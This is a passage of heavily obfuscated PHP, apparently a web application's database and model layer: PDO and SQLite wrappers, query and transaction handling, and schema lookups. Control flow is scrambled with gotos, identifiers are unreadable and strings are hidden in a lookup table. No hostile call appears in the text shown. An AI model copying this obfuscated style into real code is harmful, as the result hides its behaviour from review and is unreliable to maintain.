$a¢°ÂÒÛÜÍ) { $a¢°ÂÒÛÜÍ = $this->parseValue($a¢°ÂÒÛÜÍ); if (is_scalar($a¢°ÂÒÛÜÍ)) { $f¢À½†ÛƒĞ[] = $a¢°ÂÒÛÜÍ; } } $aíÍŠ°‘–”[] = $AÈ™Û÷ŞÊÉ[256] . implode($AÈ™Û÷ŞÊÉ[47], $f¢À½†ÛƒĞ) . $AÈ™Û÷ŞÊÉ[842]; } array_walk($cÆİ‘†³¹Ÿ, array($this, $AÈ™Û÷ŞÊÉ[843])); goto c¦µÊ« ôí; CÜÂîÓÎïå: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $F·Ş£‚‹´Ô =& $_SERVER[Š‰]; $this->error = $this->_linkID->errno . $F·Ş£‚‹´Ô[4] . $this->_linkID->error; if ($F·Ş£‚‹´Ô[33] != $this->queryStr) { $this->error .= LNG($F·Ş£‚‹´Ô[45]) . $this->queryStr; } think_trace($this->error, $F·Ş£‚‹´Ô[33], $F·Ş£‚‹´Ô[46]); return $this->error; } public function escapeString($aµ …µğ§) { if ($this->_linkID) { return $this->_linkID->real_escape_string($aµ …µğ§); } else { return addslashes($aµ …µğ§); } } public function parseKey(&$eÓ˜ğ®Ùœè, $f±±Å‚ÇÙ† = true) { $eß—›Ë¬¬è =& $_SERVER[Š‰]; if ($f±±Å‚ÇÙ†) { $eÓ˜ğ®Ùœè = $this->parseKeyCheck($eÓ˜ğ®Ùœè); } if ($eÓ˜ğ®Ùœè != $eß—›Ë¬¬è[182] && !preg_match($eß—›Ë¬¬è[848], $eÓ˜ğ®Ùœè)) { $eÓ˜ğ®Ùœè = $eß—›Ë¬¬è[380] . trim($eÓ˜ğ®Ùœè, $eß—›Ë¬¬è[380]) . $eß—›Ë¬¬è[380]; } return $eÓ˜ğ®Ùœè; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($e‡¦çÖ”»Ÿ = '') { $D™ÊŞíâ» =& $_SERVER[Š‰]; if (!class_exists($D™ÊŞíâ»[850])) { think_exception(think_lang($D™ÊŞíâ»[10]) . $D™ÊŞíâ»[851]); } if (!empty($e‡¦çÖ”»Ÿ)) { $this->config = $e‡¦çÖ”»Ÿ; if (empty($this->config[$D™ÊŞíâ»[13]])) { $this->config[$D™ÊŞíâ»[13]] = array(); } } } public function connect($bÔÑÒÓè©Ï = '', $AŒˆï¸Úáƒ = 0) { $F–“¾Úªî =& $_SERVER[Š‰]; if (!isset($this->linkID[$AŒˆï¸Úáƒ])) { goto Cé‹’Í¿‡Ñ; Cé‹’Í¿‡Ñ: if (empty($bÔÑÒÓè©Ï)) { $bÔÑÒÓè©Ï = $this->config; } $c² ‘Â·øÔ = !empty($bÔÑÒÓè©Ï[$F–“¾Úªî[13]][$F–“¾Úªî[14]]) ? $bÔÑÒÓè©Ï[$F–“¾Úªî[13]][$F–“¾Úªî[14]] : $this->pconnect; if ($c² ‘Â·øÔ) { $bÔÑÒÓè©Ï[$F–“¾Úªî[13]][PDO::ATTR_PERSISTENT] = !0; } goto E†¿ğ£éµø; E†¿ğ£éµø: try { $this->linkID[$AŒˆï¸Úáƒ] = new PDO($bÔÑÒÓè©Ï[$F–“¾Úªî[852]], $bÔÑÒÓè©Ï[$F–“¾Úªî[825]], $bÔÑÒÓè©Ï[$F–“¾Úªî[826]], $bÔÑÒÓè©Ï[$F–“¾Úªî[13]]); } catch (PDOException $b‘ïğŸ‰ë¢) { think_exception($b‘ïğŸ‰ë¢->getMessage()); } $this->dbType = $this->_getDsnType($bÔÑÒÓè©Ï[$F–“¾Úªî[852]]); if (in_array($this->dbType, array($F–“¾Úªî[853], $F–“¾Úªî[854], $F–“¾Úªî[855], $F–“¾Úªî[856]))) { think_exception($F–“¾Úªî[857] . $this->dbType . $F–“¾Úªî[858] . $this->dbType . $F–“¾Úªî[859]); } goto bˆªµ††¨ ; b›‹±†¡ì: if (1 != think_config($F–“¾Úªî[18])) { unset($this->config); } goto Då›ÕòÌæ; bˆªµ††¨ : if (!$this->linkID[$AŒˆï¸Úáƒ]) { think_exception($F–“¾Úªî[860]); } try { $this->linkID[$AŒˆï¸Úáƒ]->exec($F–“¾Úªî[861] . think_config($F–“¾Úªî[828])); } catch (Exception $b‘ïğŸ‰ë¢) { } $this->connected = !0; goto b›‹±†¡ì; Då›ÕòÌæ: } return $this->linkID[$AŒˆï¸Úáƒ]; } public function free() { $this->PDOStatement = null; } public function query($b¼î‹ª—â, $d—¯ƒù­·¤ = array()) { goto aæŒ©ºÎäª; aæŒ©ºÎäª: $b¬’Î±İÈ½ =& $_SERVER[Š‰]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F…”Å¡«£é; F…”Å¡«£é: $this->queryStr = $b¼î‹ª—â; if (!empty($d—¯ƒù­·¤)) { $this->queryStr .= $b¬’Î±İÈ½[862] . print_r($d—¯ƒù­·¤, !0) . $b¬’Î±İÈ½[863]; } if (!empty($this->PDOStatement)) { $this->free(); } goto EÙ¿æòª˜; EÙ¿æòª˜: think_action_status($b¬’Î±İÈ½[19], 1); think_status($b¬’Î±İÈ½[20]); $this->PDOStatement = $this->_linkID->prepare($b¼î‹ª—â); goto Fá˜ÄÄ„ïè; bŞ¼ğòÍ¼Ş: if (!1 === $A”à’Î¾ß¾) { $this->error(); return !1; } else { return $this->getAll(); } goto E­•‡³¬·; Fá˜ÄÄ„ïè: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $A”à’Î¾ß¾ = $this->PDOStatement->execute($d—¯ƒù­·¤); $this->debug(); goto bŞ¼ğòÍ¼Ş; E­•‡³¬·: } public function execute($BÒÓ¾¥àÚ, $b‰Ò£ÈÃ¸Ø = array()) { goto FíÍºÚÑù; Dæöì‘ÕÉ²: if ($this->dbType == $F”œĞŒ°Ş[856]) { if (preg_match($F”œĞŒ°Ş[864], $this->queryStr, $aÖ¸œ±è×â)) { $this->table = think_config($F”œĞŒ°Ş[865]) . str_ireplace(think_config($F”œĞŒ°Ş[866]), $F”œĞŒ°Ş[373], $aÖ¸œ±è×â[2]); $DëÅ»†è â = (bool) $this->query($F”œĞŒ°Ş[867] . strtoupper($this->table) . $F”œĞŒ°Ş[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($F”œĞŒ°Ş[21], 1); goto B¨Ö¤Š›‚; e¹›¾Ç“ÈÊ: $this->queryStr = $BÒÓ¾¥àÚ; if (!empty($b‰Ò£ÈÃ¸Ø)) { $this->queryStr .= $F”œĞŒ°Ş[862] . print_r($b‰Ò£ÈÃ¸Ø, !0) . $F”œĞŒ°Ş[863]; } $DëÅ»†è â = !1; goto Dæöì‘ÕÉ²; ağíÓ£¢”Í: $aùö¿Û¸ãÎ = $this->PDOStatement->execute($b‰Ò£ÈÃ¸Ø); $this->debug(); if (!1 === $aùö¿Û¸ãÎ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($DëÅ»†è â || preg_match($F”œĞŒ°Ş[868], $BÒÓ¾¥àÚ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto aÅ‡·»¸àŒ; B¨Ö¤Š›‚: think_status($F”œĞŒ°Ş[20]); $this->PDOStatement = $this->_linkID->prepare($BÒÓ¾¥àÚ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto ağíÓ£¢”Í; FíÍºÚÑù: $F”œĞŒ°Ş =& $_SERVER[Š‰]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e¹›¾Ç“ÈÊ; aÅ‡·»¸àŒ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b…Ô½¶›ò‘ = $this->_linkID->commit(); $this->transTimes = 0; if (!$b…Ô½¶›ò‘) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $b¥¬Ë˜’‚“ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$b¥¬Ë˜’‚“) { $this->error(); return !1; } } return !0; } private function getAll() { $B‚‘öñ˜÷ƒ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($B‚‘öñ˜÷ƒ); return $B‚‘öñ˜÷ƒ; } public function getFields($fÆÂ…Ï™î) { goto e»«Ø™–Ö¹; B°îƒˆğš: return $a¹ŠµØÓ…; goto a¦ƒàî‘îª; e»«Ø™–Ö¹: $a£Àİ¯´Ã =& $_SERVER[Š‰]; $this->initConnect(!0); if (think_config($a£Àİ¯´Ã[869])) { $CÌÑÅöàíÔ = str_replace($a£Àİ¯´Ã[870], $fÆÂ…Ï™î, think_config($a£Àİ¯´Ã[869])); } else { switch ($this->dbType) { case $a£Àİ¯´Ã[853]: case $a£Àİ¯´Ã[871]: $CÌÑÅöàíÔ = "\123\x45\114\x45\103\124\x20\40\x20\x63\157\x6c\x75\155\156\137\x6e\141\x6d\x65\40\141\163\40\x27\116\x61\155\145\x27\x2c\40\40\40\144\x61\x74\141\x5f\x74\171\160\x65\x20\141\x73\x20\47\x54\171\x70\x65\x27\54\40\40\40\143\157\154\x75\x6d\156\x5f\144\145\x66\141\x75\x6c\x74\x20\141\163\40\x27\x44\145\x66\141\x75\x6c\164\x27\54\x20\x20\x20\x69\x73\137\156\165\154\154\141\142\154\x65\40\x61\163\x20\47\x4e\165\x6c\x6c\47\xa\11\11\x46\122\x4f\115\x9\x69\156\x66\157\162\155\x61\x74\151\x6f\x6e\x5f\x73\x63\x68\x65\155\x61\56\x74\141\x62\154\145\163\40\x41\123\40\x74\12\x9\x9\x4a\117\111\x4e\x9\151\x6e\146\157\x72\155\141\x74\x69\157\x6e\x5f\163\x63\150\145\155\141\56\x63\x6f\x6c\165\155\156\163\x20\101\x53\40\143\xa\11\11\117\116\40\x20\164\x2e\164\141\x62\x6c\x65\x5f\143\x61\164\141\x6c\157\x67\x20\75\x20\x63\x2e\x74\x61\142\x6c\x65\x5f\x63\x61\x74\141\154\x6f\147\12\11\x9\101\x4e\104\40\164\56\x74\141\x62\x6c\145\137\x73\143\150\x65\x6d\x61\x20\x3d\x20\x63\x2e\164\141\x62\154\145\137\163\143\150\x65\x6d\141\xa\11\x9\101\116\x44\x20\164\x2e\x74\x61\142\x6c\145\x5f\x6e\x61\155\x65\x20\x3d\40\143\x2e\x74\x61\142\154\145\137\x6e\141\155\x65\xa\11\x9\127\110\x45\122\105\40\40\40\x74\56\164\x61\x62\x6c\145\x5f\x6e\x61\x6d\x65\x20\75\x20\47{$fÆÂ…Ï™î}\47"; break; case $a£Àİ¯´Ã[872]: $CÌÑÅöàíÔ = $a£Àİ¯´Ã[873] . $fÆÂ…Ï™î . $a£Àİ¯´Ã[874]; break; case $a£Àİ¯´Ã[854]: case $a£Àİ¯´Ã[856]: $CÌÑÅöàíÔ = $a£Àİ¯´Ã[875] . $a£Àİ¯´Ã[876] . $a£Àİ¯´Ã[877] . strtoupper($fÆÂ…Ï™î) . $a£Àİ¯´Ã[878] . strtoupper($fÆÂ…Ï™î) . $a£Àİ¯´Ã[879]; break; case $a£Àİ¯´Ã[880]: $CÌÑÅöàíÔ = $a£Àİ¯´Ã[881] . $fÆÂ…Ï™î . $a£Àİ¯´Ã[882]; break; case $a£Àİ¯´Ã[855]: break; case $a£Àİ¯´Ã[883]: default: $CÌÑÅöàíÔ = $a£Àİ¯´Ã[884] . ($this->dbType == $a£Àİ¯´Ã[883] ? "\140{$fÆÂ…Ï™î}\140" : $fÆÂ…Ï™î); } } goto eªëŠ«äÆ; eªëŠ«äÆ: $bÊœéåØ· = $this->query($CÌÑÅöàíÔ); $a¹ŠµØÓ… = array(); if ($bÊœéåØ·) { foreach ($bÊœéåØ· as $cà˜‘ÒÚØ => $D¿ïÚ¸“º) { $D¿ïÚ¸“º = array_change_key_case($D¿ïÚ¸“º); $D¿ïÚ¸“º[$a£Àİ¯´Ã[28]] = isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[28]]) ? $D¿ïÚ¸“º[$a£Àİ¯´Ã[28]] : $a£Àİ¯´Ã[373]; $D¿ïÚ¸“º[$a£Àİ¯´Ã[29]] = isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[29]]) ? $D¿ïÚ¸“º[$a£Àİ¯´Ã[29]] : $a£Àİ¯´Ã[373]; $DÌßˆÚ×Œ× = isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[269]]) ? $D¿ïÚ¸“º[$a£Àİ¯´Ã[269]] : $D¿ïÚ¸“º[$a£Àİ¯´Ã[28]]; $a¹ŠµØÓ…[$DÌßˆÚ×Œ×] = array($a£Àİ¯´Ã[28] => $DÌßˆÚ×Œ×, $a£Àİ¯´Ã[29] => $D¿ïÚ¸“º[$a£Àİ¯´Ã[29]], $a£Àİ¯´Ã[31] => (bool) (isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[102]]) && $D¿ïÚ¸“º[$a£Àİ¯´Ã[102]] === $a£Àİ¯´Ã[33] || isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[31]]) && $D¿ïÚ¸“º[$a£Àİ¯´Ã[31]] === $a£Àİ¯´Ã[33]), $a£Àİ¯´Ã[34] => isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[34]]) ? $D¿ïÚ¸“º[$a£Àİ¯´Ã[34]] : (isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[53]]) ? $D¿ïÚ¸“º[$a£Àİ¯´Ã[53]] : $a£Àİ¯´Ã[373]), $a£Àİ¯´Ã[36] => isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[92]]) ? strtolower($D¿ïÚ¸“º[$a£Àİ¯´Ã[92]]) == $a£Àİ¯´Ã[38] : (isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[54]]) ? $D¿ïÚ¸“º[$a£Àİ¯´Ã[54]] : !1), $a£Àİ¯´Ã[39] => isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[885]]) ? strtolower($D¿ïÚ¸“º[$a£Àİ¯´Ã[885]]) == $a£Àİ¯´Ã[41] : (isset($D¿ïÚ¸“º[$a£Àİ¯´Ã[92]]) ? $D¿ïÚ¸“º[$a£Àİ¯´Ã[92]] : !1)); } } goto B°îƒˆğš; a¦ƒàî‘îª: } public function getTables($dÖ¿²´í = '') { $c¦æÖªãğ« =& $_SERVER[Š‰]; if (think_config($c¦æÖªãğ«[886])) { $cƒ¥ê«·¢Š = str_replace($c¦æÖªãğ«[887], $dÖ¿²´í, think_config($c¦æÖªãğ«[886])); } else { switch ($this->dbType) { case $c¦æÖªãğ«[854]: case $c¦æÖªãğ«[856]: $cƒ¥ê«·¢Š = $c¦æÖªãğ«[888]; break; case $c¦æÖªãğ«[853]: case $c¦æÖªãğ«[871]: $cƒ¥ê«·¢Š = $c¦æÖªãğ«[889]; break; case $c¦æÖªãğ«[880]: $cƒ¥ê«·¢Š = $c¦æÖªãğ«[890]; break; case $c¦æÖªãğ«[855]: think_exception(think_lang($c¦æÖªãğ«[891]) . $c¦æÖªãğ«[892]); break; case $c¦æÖªãğ«[872]: $cƒ¥ê«·¢Š = $c¦æÖªãğ«[42] . $c¦æÖªãğ«[43] . $c¦æÖªãğ«[44]; break; case $c¦æÖªãğ«[883]: default: if (!empty($dÖ¿²´í)) { $cƒ¥ê«·¢Š = $c¦æÖªãğ«[836] . $dÖ¿²´í . $c¦æÖªãğ«[837]; } else { $cƒ¥ê«·¢Š = $c¦æÖªãğ«[838]; } } } $FŠ˜íêÖ¨ = $this->query($cƒ¥ê«·¢Š); $E‚æãš°í = array(); foreach ($FŠ˜íêÖ¨ as $aíİˆğÜõÙ => $BÀ¶ºåÏ™˜) { $E‚æãš°í[$aíİˆğÜõÙ] = current($BÀ¶ºåÏ™˜); } return $E‚æãš°í; } protected function parseLimit($EÉØÇ‡­‰î) { $A«ÛÎÂš¢ê =& $_SERVER[Š‰]; $F‹ï‘ã©„î = $A«ÛÎÂš¢ê[33]; if (!empty($EÉØÇ‡­‰î)) { switch ($this->dbType) { case $A«ÛÎÂš¢ê[880]: case $A«ÛÎÂš¢ê[872]: $EÉØÇ‡­‰î = explode($A«ÛÎÂš¢ê[47], $EÉØÇ‡­‰î); if (count($EÉØÇ‡­‰î) > 1) { $F‹ï‘ã©„î .= $A«ÛÎÂš¢ê[48] . $EÉØÇ‡­‰î[1] . $A«ÛÎÂš¢ê[49] . $EÉØÇ‡­‰î[0] . $A«ÛÎÂš¢ê[50]; } else { $F‹ï‘ã©„î .= $A«ÛÎÂš¢ê[48] . $EÉØÇ‡­‰î[0] . $A«ÛÎÂš¢ê[50]; } break; case $A«ÛÎÂš¢ê[853]: case $A«ÛÎÂš¢ê[871]: break; case $A«ÛÎÂš¢ê[855]: break; case $A«ÛÎÂš¢ê[854]: case $A«ÛÎÂš¢ê[856]: break; case $A«ÛÎÂš¢ê[883]: default: $F‹ï‘ã©„î .= $A«ÛÎÂš¢ê[48] . $EÉØÇ‡­‰î . $A«ÛÎÂš¢ê[50]; } } return $F‹ï‘ã©„î; } public function parseKey(&$F—±¿„Š¤‚, $EËö˜¶×†· = true) { $fòââÀå½¬ =& $_SERVER[Š‰]; if ($EËö˜¶×†·) { $F—±¿„Š¤‚ = $this->parseKeyCheck($F—±¿„Š¤‚); } if ($this->dbType == $fòââÀå½¬[883]) { if ($F—±¿„Š¤‚ != $fòââÀå½¬[182] && !preg_match($fòââÀå½¬[848], $F—±¿„Š¤‚)) { $F—±¿„Š¤‚ = $fòââÀå½¬[380] . trim($F—±¿„Š¤‚, $fòââÀå½¬[380]) . $fòââÀå½¬[380]; } return $F—±¿„Š¤‚; } else { return parent::parseKey($F—±¿„Š¤‚); } } public function close() { $this->_linkID = null; } public function error() { $aì‹ãÄÁò² =& $_SERVER[Š‰]; if ($this->PDOStatement) { $C‚¨÷â‘ = $this->PDOStatement->errorInfo(); $this->error = $C‚¨÷â‘[1] . $aì‹ãÄÁò²[4] . $C‚¨÷â‘[2]; } else { $this->error = $aì‹ãÄÁò²[33]; } if ($aì‹ãÄÁò²[33] != $this->queryStr) { $this->error .= LNG($aì‹ãÄÁò²[45]) . $this->queryStr; } think_trace($this->error, $aì‹ãÄÁò²[33], $aì‹ãÄÁò²[46]); return $this->error; } public function escapeString($bßƒŞîà²) { $bç‚ÛâÉÀµ =& $_SERVER[Š‰]; switch ($this->dbType) { case $bç‚ÛâÉÀµ[880]: case $bç‚ÛâÉÀµ[853]: case $bç‚ÛâÉÀµ[871]: case $bç‚ÛâÉÀµ[883]: return addslashes($bßƒŞîà²); case $bç‚ÛâÉÀµ[855]: case $bç‚ÛâÉÀµ[872]: case $bç‚ÛâÉÀµ[854]: case $bç‚ÛâÉÀµ[856]: return str_ireplace($bç‚ÛâÉÀµ[55], $bç‚ÛâÉÀµ[56], $bßƒŞîà²); } } protected function parseValue($Eİí×¨¼Úï) { $D…©ƒŞÕçÚ =& $_SERVER[Š‰]; if (is_string($Eİí×¨¼Úï)) { $Eİí×¨¼Úï = strpos($Eİí×¨¼Úï, $D…©ƒŞÕçÚ[4]) === 0 ? $this->escapeString($Eİí×¨¼Úï) : $D…©ƒŞÕçÚ[893] . $this->escapeString($Eİí×¨¼Úï) . $D…©ƒŞÕçÚ[893]; } elseif (isset($Eİí×¨¼Úï[0]) && is_string($Eİí×¨¼Úï[0]) && strtolower($Eİí×¨¼Úï[0]) == $D…©ƒŞÕçÚ[293]) { $Eİí×¨¼Úï = $this->escapeString($Eİí×¨¼Úï[1]); } elseif (is_array($Eİí×¨¼Úï)) { $Eİí×¨¼Úï = array_map(array($this, $D…©ƒŞÕçÚ[894]), $Eİí×¨¼Úï); } elseif (is_bool($Eİí×¨¼Úï)) { $Eİí×¨¼Úï = $Eİí×¨¼Úï ? $D…©ƒŞÕçÚ[86] : $D…©ƒŞÕçÚ[491]; } elseif (is_null($Eİí×¨¼Úï)) { $Eİí×¨¼Úï = $D…©ƒŞÕçÚ[102]; } return $Eİí×¨¼Úï; } public function getLastInsertId() { $FéÂîíÀê =& $_SERVER[Š‰]; switch ($this->dbType) { case $FéÂîíÀê[880]: case $FéÂîíÀê[872]: case $FéÂîíÀê[853]: case $FéÂîíÀê[871]: case $FéÂîíÀê[855]: case $FéÂîíÀê[883]: return $this->_linkID->lastInsertId(); case $FéÂîíÀê[854]: case $FéÂîíÀê[856]: $Bë»¯¤Ü“‚ = $this->table; $CØ³²½ÀÉ = $this->query("\123\105\114\x45\x43\x54\x20{$Bë»¯¤Ü“‚}\x2e\143\165\162\x72\x76\141\x6c\x20\143\x75\x72\x72\166\x61\154\x20\106\122\x4f\115\x20\x64\165\x61\x6c"); return $CØ³²½ÀÉ ? $CØ³²½ÀÉ[0][$FéÂîíÀê[895]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($FõœóˆÀ©¦) { $d’„Ì²ŞÖ‘ =& $_SERVER[Š‰]; if (!CacheLock::fileLock($d’„Ì²ŞÖ‘[9])) { return !1; } $f†Şæ•Û°¥ = parent::query($FõœóˆÀ©¦); CacheLock::fileUnLock($d’„Ì²ŞÖ‘[9]); return $f†Şæ•Û°¥; } public function execute($F‘”£’á) { $dƒÈÃ±ğ† =& $_SERVER[Š‰]; if (!CacheLock::fileLock($dƒÈÃ±ğ†[9])) { return !1; } $CÊëÍ‘Áæˆ = parent::execute($F‘”£’á); CacheLock::fileUnLock($dƒÈÃ±ğ†[9]); return $CÊëÍ‘Áæˆ; } } goto AéÊãÒ˜„÷; AŠ·øÏ¬Ÿ: define($_SERVER[Š‰][238], 0); define($_SERVER[Š‰][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\145", "\x6f\x72\144\145\162", "\141\x6c\151\x61\163", "\x68\141\166\151\x6e\147", "\x67\162\157\x75\160", "\154\x6f\143\153", "\x64\151\x73\164\151\156\143\164", "\141\x75\x74\x6f", "\146\x69\154\x74\145\162", "\166\x61\154\x69\144\x61\164\145", "\x72\145\163\x75\x6c\164", "\142\151\156\x64", "\164\x6f\x6b\145\x6e"); public function __construct($Aù–ĞŸ¬‹ = '', $eÄ¯ÅÎÜòš = '', $B´ÅäÈ“§ = '') { $AÎí°Á£ÎÅ =& $_SERVER[Š‰]; $this->_initialize(); if (!empty($Aù–ĞŸ¬‹)) { if (strpos($Aù–ĞŸ¬‹, $AÎí°Á£ÎÅ[94])) { list($this->dbName, $this->name) = explode($AÎí°Á£ÎÅ[94], $Aù–ĞŸ¬‹); } else { $this->name = $Aù–ĞŸ¬‹; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($eÄ¯ÅÎÜòš)) { $this->tablePrefix = $AÎí°Á£ÎÅ[33]; } elseif ($AÎí°Á£ÎÅ[33] != $eÄ¯ÅÎÜòš) { $this->tablePrefix = $eÄ¯ÅÎÜòš; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($AÎí°Á£ÎÅ[240]); } $this->db(0, empty($this->connection) ? $B´ÅäÈ“§ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $A¯ñ‘¡÷¾ =& $_SERVER[Š‰]; if (empty($this->fields)) { if (think_config($A¯ñ‘¡÷¾[241])) { $bÉÎßíÆ­ = $this->dbName ? $this->dbName : think_config($A¯ñ‘¡÷¾[242]); $Bñ÷ó¢ÜÏƒ = think_var_cache($A¯ñ‘¡÷¾[243] . strtolower(get_path_this($bÉÎßíÆ­) . $A¯ñ‘¡÷¾[94] . $this->name)); if ($Bñ÷ó¢ÜÏƒ) { $E²†ÕÍÚƒŞ = think_config($A¯ñ‘¡÷¾[244]); if (empty($E²†ÕÍÚƒŞ) || $Bñ÷ó¢ÜÏƒ[$A¯ñ‘¡÷¾[245]] == $E²†ÕÍÚƒŞ) { $this->fields = $Bñ÷ó¢ÜÏƒ; return; } } } $this->flush(); } } public function flush() { goto D¯‰«Ø¯†î; D¯‰«Ø¯†î: $dÏ±Û’æö¤ =& $_SERVER[Š‰]; $this->db->setModel($this->name); $F““¬³æ = $this->db->getFields($this->getTableName()); goto Aœ¼Ò§’È¿; d‡œ¦ åµ: if (think_config($dÏ±Û’æö¤[241])) { $b–ÜµòŸË = $this->dbName ? $this->dbName : think_config($dÏ±Û’æö¤[242]); think_var_cache($dÏ±Û’æö¤[243] . strtolower(get_path_this($b–ÜµòŸË) . $dÏ±Û’æö¤[94] . $this->name), $this->fields); } goto aœó‹Ê¾ĞÌ; dóÍÛß: foreach ($F““¬³æ as $c™Ï£îñ¾¬ => $Cœ„·‹®¨œ) { $a¬¸‚•Æ¹‚[$c™Ï£îñ¾¬] = $Cœ„·‹®¨œ[$dÏ±Û’æö¤[29]]; if ($Cœ„·‹®¨œ[$dÏ±Û’æö¤[36]]) { $this->fields[$dÏ±Û’æö¤[247]] = $c™Ï£îñ¾¬; if ($Cœ„·‹®¨œ[$dÏ±Û’æö¤[39]]) { $this->fields[$dÏ±Û’æö¤[246]] = !0; } } } $this->fields[$dÏ±Û’æö¤[248]] = $a¬¸‚•Æ¹‚; if (think_config($dÏ±Û’æö¤[244])) { $this->fields[$dÏ±Û’æö¤[245]] = think_config($dÏ±Û’æö¤[244]); } goto d‡œ¦ åµ; Aœ¼Ò§’È¿: if (!$F““¬³æ) { return !1; } $this->fields = array_keys($F““¬³æ); $this->fields[$dÏ±Û’æö¤[246]] = !1; goto dóÍÛß; aœó‹Ê¾ĞÌ: } public function switchModel($Dë‚ƒêÚ, $F¿ƒ‹ëÖà× = array()) { $cã¤ÑÛ‹ ß =& $_SERVER[Š‰]; $C¶”’†™¯ = ucwords(strtolower($Dë‚ƒêÚ)) . $cã¤ÑÛ‹ ß[249]; if (!class_exists($C¶”’†™¯)) { think_exception($C¶”’†™¯ . think_lang($cã¤ÑÛ‹ ß[250])); } $this->_extModel = new $C¶”’†™¯($this->name); if (!empty($F¿ƒ‹ëÖà×)) { foreach ($F¿ƒ‹ëÖà× as $e´»²ÆØŒï) { $this->_extModel->setProperty($e´»²ÆØŒï, $this->{$e´»²ÆØŒï}); } } return $this->_extModel; } public function __set($F“ÍŠó°Ğ½, $bÅÒÖ¬ï¯ğ) { $this->data[$F“ÍŠó°Ğ½] = $bÅÒÖ¬ï¯ğ; } public function __get($dâ’ÔßÉÈ) { return isset($this->data[$dâ’ÔßÉÈ]) ? $this->data[$dâ’ÔßÉÈ] : null; } public function __isset($a†‚–ˆ­ã) { return isset($this->data[$a†‚–ˆ­ã]); } public function __unset($aè¬ºËğğ) { unset($this->data[$aè¬ºËğğ]); } public function __call($e”ÒÖ½äåï, $cå…Œ×Ç÷¯) { $d‰÷—è‰„ˆ =& $_SERVER[Š‰]; if (in_array(strtolower($e”ÒÖ½äåï), $this->methods, !0)) { $this->options[strtolower($e”ÒÖ½äåï)] = $cå…Œ×Ç÷¯[0]; return $this; } elseif (in_array(strtolower($e”ÒÖ½äåï), array($d‰÷—è‰„ˆ[251], $d‰÷—è‰„ˆ[252], $d‰÷—è‰„ˆ[253], $d‰÷—è‰„ˆ[254], $d‰÷—è‰„ˆ[255]), !0)) { $DóÍÃ‰Ì¯â = isset($cå…Œ×Ç÷¯[0]) ? $cå…Œ×Ç÷¯[0] : $d‰÷—è‰„ˆ[182]; $DóÍÃ‰Ì¯â = $this->db->parseKey($DóÍÃ‰Ì¯â); return $this->getField(strtoupper($e”ÒÖ½äåï) . $d‰÷—è‰„ˆ[256] . $DóÍÃ‰Ì¯â . $d‰÷—è‰„ˆ[257] . $e”ÒÖ½äåï, $d‰÷—è‰„ˆ[251]); } elseif (strtolower(substr($e”ÒÖ½äåï, 0, 5)) == $d‰÷—è‰„ˆ[258]) { $DóÍÃ‰Ì¯â = think_parse_name(substr($e”ÒÖ½äåï, 5)); $CĞ˜‡¹£ùº[$DóÍÃ‰Ì¯â] = $cå…Œ×Ç÷¯[0]; return $this->where($CĞ˜‡¹£ùº)->find(); } elseif (strtolower(substr($e”ÒÖ½äåï, 0, 10)) == $d‰÷—è‰„ˆ[259]) { $cùî¯Ãœ¡ë = think_parse_name(substr($e”ÒÖ½äåï, 10)); $CĞ˜‡¹£ùº[$cùî¯Ãœ¡ë] = $cå…Œ×Ç÷¯[0]; return $this->where($CĞ˜‡¹£ùº)->getField($cå…Œ×Ç÷¯[1]); } elseif (isset($this->_scope[$e”ÒÖ½äåï])) { return $this->scope($e”ÒÖ½äåï, $cå…Œ×Ç÷¯[0]); } elseif (method_exists($this, $e”ÒÖ½äåï)) { array_unshift($cå…Œ×Ç÷¯, $e”ÒÖ½äåï); return call_user_func_array(array($this, $d‰÷—è‰„ˆ[260]), $cå…Œ×Ç÷¯); } else { return call_user_func_array(array(parent, $e”ÒÖ½äåï), $cå…Œ×Ç÷¯); } } protected function call() { goto b·“ğ·–Î; b·“ğ·–Î: $fÚ’ì½†ƒÓ =& $_SERVER[Š‰]; $aöíÕˆëñ² = func_get_args(); $Fª×÷½Ú½» = array_shift($aöíÕˆëñ²); goto E¶â¯Ş´¼£; D¢¸ë¡»Ì: if (isset($aöíÕˆëñ²[$C¯ÅÕÓ¹Úæ]) && $aöíÕˆëñ²[$C¯ÅÕÓ¹Úæ] === $Fª×÷½Ú½») { think_exception(__CLASS__ . $fÚ’ì½†ƒÓ[4] . $Fª×÷½Ú½» . think_lang($fÚ’ì½†ƒÓ[261])); return; } 